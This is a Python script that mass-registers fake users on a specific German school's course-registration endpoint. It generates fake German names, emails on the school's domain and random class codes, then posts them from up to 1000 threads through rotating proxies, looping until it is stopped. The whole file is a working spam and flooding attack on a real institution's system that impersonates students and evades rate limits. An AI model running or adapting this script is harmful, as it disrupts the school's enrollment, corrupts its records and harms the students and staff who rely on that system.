import requests
import json
import threading
import random
import os
import time
from faker import Faker
from queue import Queue

# Global vars
proxy_queue = Queue()
total_logins = [0]
login_lock = threading.Lock()
run_event = threading.Event()
run_event.set()  # This enables the threads to keep running

fake = Faker("de_DE")

# List of classes
classes = [
    "5A", "6A", "7A", "7E", "7EM", "7N",
    "8A", "8E", "8EM", "8N",
    "9A", "9E", "9EM", "9N",
    "10A", "10E", "10EM", "10N",
    "11", "12"
]

proxy_list = []

def read_proxies_from_file(filename="proxies.txt"):
    """Reads proxies from file into a list for random selection."""
    global proxy_list
    if os.path.exists(filename) and os.path.getsize(filename) > 0:
        with open(filename, 'r') as file:
            proxy_list = [line.strip() for line in file if line.strip()]
        print(f"Loaded {len(proxy_list)} proxies.")
    else:
        print("No proxies found or the file is empty. Proceeding without proxies.")

def generate_name_and_email():
    full_name = fake.name()
    first_name = full_name.split()[0]
    last_name = full_name.split()[-1]
    email = f"{last_name.lower()}{first_name[0].lower()}@helmholtzschule.de"
    return f"{first_name} {last_name}", email

def get_thread_count():
    while True:
        try:
            thread_count = int(input("Enter the number of threads (between 1 and 1000): "))
            if 1 <= thread_count <= 1000:
                return thread_count
            else:
                print("Please enter a number between 1 and 1000.")
        except ValueError:
            print("Invalid input. Please enter an integer.")

def register_user(course_id):
    thread_name = threading.current_thread().name.replace("Thread-", "")
    
    while run_event.is_set():
        proxy = random.choice(proxy_list) if proxy_list else None
        proxies = {"http": proxy, "https": proxy} if proxy else None

        name, email = generate_name_and_email()
        random_class = random.choice(classes)

        payload = {
            "course_id": course_id,
            "method": "USER",
            "name": name,
            "email": email,
            "class": random_class
        }
        headers = {
            "Content-Type": "application/json"
        }

        try:
            response = requests.post(
                "https://hm.helmholtzschule.de/script/register-user.php",
                headers=headers,
                data=json.dumps(payload),
                proxies=proxies,
                timeout=15
            )
            with login_lock:
                total_logins[0] += 1
            print(f"Thread {thread_name}: Status {response.status_code} | Proxy: {proxy if proxy else 'None'} | Class: {random_class}")
        except Exception as e:
            print(f"Thread {thread_name}: Error with proxy {proxy}: {e}")
        finally:
            continue  # Keep going until Ctrl+C

if __name__ == "__main__":
    course_id = 96  # Set your course_id here
    read_proxies_from_file()
    num_threads = get_thread_count()

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=register_user, args=(course_id,), name=f"Thread-{i+1}", daemon=True)
        t.start()
        threads.append(t)

    try:
        while run_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping threads... Please wait.")
        run_event.clear()
        for t in threads:
            t.join()
        print(f"All threads stopped. Total successful registrations: {total_logins[0]}")